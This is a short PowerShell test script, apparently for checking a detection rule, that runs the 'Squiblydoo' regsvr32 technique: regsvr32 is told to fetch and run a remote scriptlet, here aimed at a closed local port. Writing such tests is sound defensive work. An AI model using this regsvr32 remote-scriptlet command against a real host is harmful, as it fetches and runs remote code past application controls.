# Atomic test - rule 9a0c3e75-6d8b-4f12-bc34-1e7a5d9c0b06
#   "Regsvr32 Remote Scriptlet Execution (Squiblydoo)"  (process_creation)
#
# Runs regsvr32 with a remote scriptlet argument pointed at a closed local port.
$ErrorActionPreference = 'SilentlyContinue'
& regsvr32.exe /s /n /u /i:http://127.0.0.1:9/rustinel.sct scrobj.dll | Out-Null
exit 0
